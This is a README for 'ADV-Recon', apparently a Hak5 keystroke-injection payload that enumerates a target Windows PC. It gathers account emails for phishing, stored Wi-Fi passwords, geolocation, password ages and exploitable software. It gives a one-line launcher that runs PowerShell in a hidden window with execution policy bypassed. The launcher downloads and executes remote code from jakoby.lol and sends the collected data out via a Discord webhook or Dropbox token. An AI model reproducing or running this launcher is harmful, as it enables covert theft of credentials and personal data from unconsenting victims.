![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)

<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#Description">Description</a></li>
    <li><a href="#getting-started">Getting Started</a></li>
    <li><a href="#Contributing">Contributing</a></li>
    <li><a href="#Version-History">Version History</a></li>
    <li><a href="#Contact">Contact</a></li>
    <li><a href="#Acknowledgments">Acknowledgments</a></li>
  </ol>
</details>

# ADV-Recon

A script used to do an advanced level of recon on the target's computer.

Version 2 no longer requires you to host your own version of the script.

Modifying the execution script is the only necessary interaction.

## Description

This program enumerates a target PC to collect as much recon data as possible for future engagements. This includes:

* Hosts PowerShell Version (to know what commands can be run)
* Name associated with their Microsoft account (Or ENV UserName variable if one is not detected)
* Whether they are in the Admin group or not
* The email associated with their Microsoft account (for phishing possibilities)
* Other User accounts on their system (for possible privilege escalation)
* Details on their login settings (Ex: Min/Max password age and length)
* How many days since they have changed their password (Max password age - Days since = Opportunity)
* Their GeoLocation (know their approximate where abouts)
* Nearby Wifi Networks (Possible lateral movement)
* Network Info (Local and Public IP Address; MAC Address; RDP Enabled?)
* WLAN Profiles (List of SSIDs and Passwords stored on their PC)
* Network Interfaces (What are they connecting in and out with)
* System Information (Manufacturer, Model, Serial Number, OS, CPU, RAM, Mainboard BIOS)
* Local Users (Accounts on system with Username, name associated with microsoft account and SID)
* Information on their hard drives (Indicator of Recon Scope)
* COM and Serial Devices (Is there a device connected you can manipulate?)
* Active TCP Connections (Poor mans Port Scanning)
* Processes, Services, Software, and Drivers (What is running on the computer we can exploit?)
* Video Card info (how much vroom vroom?)
* Tree Command (Gain a more accurate assessment of what to exfil or use in Phishing attacks)

## Getting Started

### Dependencies

* Dropbox or Discord
* Windows 10,11

<p align="right">(<a href="#top">back to top</a>)</p>

### Executing program

* Plug in your device
* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory

`$dc` is the variable that stores your discord webhook 

`$db` is the variable that stores your dropbox token 

Fill in either or both of these two methods to exfil your collected data

```
powershell -w h -NoP -Ep Bypass $dc='';$db='';irm jakoby.lol/9nb | iex
```

<p align="right">(<a href="#top">back to top</a>)</p>

## Contributing

All contributors names will be listed here

I am Jakoby

<p align="right">(<a href="#top">back to top</a>)</p>

## Version History

* 0.1
    * Initial Release

* 0.2
    * Added additional data queries
    * Optimized output of data

<p align="right">(<a href="#top">back to top</a>)</p>

<!-- CONTACT -->
## Contact

<h2 align="center">📱 My Socials 📱</h2>
<div align=center>
<table>
  <tr>
    <td align="center" width="96">
      <a href="https://youtube.com/c/IamJakoby?sub_confirmation=1">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/youtube-svgrepo-com.svg width="48" height="48" alt="C#" />
      </a>
      <br>YouTube
    </td>
    <td align="center" width="96">
      <a href="https://twitter.com/I_Am_Jakoby">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/twitter.png width="48" height="48" alt="Python" />
      </a>
      <br>Twitter
    </td>
    <td align="center" width="96">
      <a href="https://www.instagram.com/i_am_jakoby/">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/insta.png width="48" height="48" alt="Golang" />
      </a>
      <br>Instagram
    </td>
    <td align="center" width="96">
      <a href="https://discord.gg/MYYER2ZcJF">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/discord-v2-svgrepo-com.svg width="48" height="48" alt="Jsonnet" />
      </a>
      <br>Discord
    </td>
    <td align="center" width="96">
      <a href="https://www.tiktok.com/@i_am_jakoby?lang=en">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/img/tiktok.svg width="48" height="48" alt="Jsonnet" />
      </a>
      <br>TikTok
    </td>    
  </tr>
</table>
</div>



<p align="right">(<a href="#top">back to top</a>)</p>

<!-- ACKNOWLEDGMENTS -->
## Acknowledgments

* [Hak5](https://hak5.org/)
* [MG](https://github.com/OMG-MG)

<p align="right">(<a href="#top">back to top</a>)</p>
